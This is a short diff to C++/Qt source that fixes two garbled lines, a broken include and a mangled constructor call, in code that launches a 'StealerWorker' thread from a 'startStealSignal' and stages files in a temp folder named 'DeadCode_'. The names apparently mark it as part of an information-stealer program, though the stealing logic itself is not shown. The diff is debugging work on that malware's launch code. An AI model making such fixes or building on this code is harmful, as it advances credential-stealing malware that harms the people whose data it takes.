@@ -53,7 +53,7 @@
 #include <QRunnable>
 #include <cstring>
 #include <QByteArray>
-#include5722#include <array>
+#include <array>
 
 // Пространство имён для filesystem
 namespace fs = std::filesystem;
@@ -368,7 +368,7 @@ MainWindow::MainWindow(QWidget *parent)
     connect(this, &MainWindow::startStealSignal, this, [this]() {
         std::string tempDir = std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") + "\\DeadCode_" + generateRandomString(8);
         QThread* thread = new QThread;
-        StealerWorker* worker = new Ste    StealerWorker(this, tempDir);
+        StealerWorker* worker = new StealerWorker(this, tempDir);
         worker->moveToThread(thread);
         connect(thread, &QThread::started, worker, &StealerWorker::process);
         connect(worker, &StealerWorker::finished, thread, &QThread::quit);
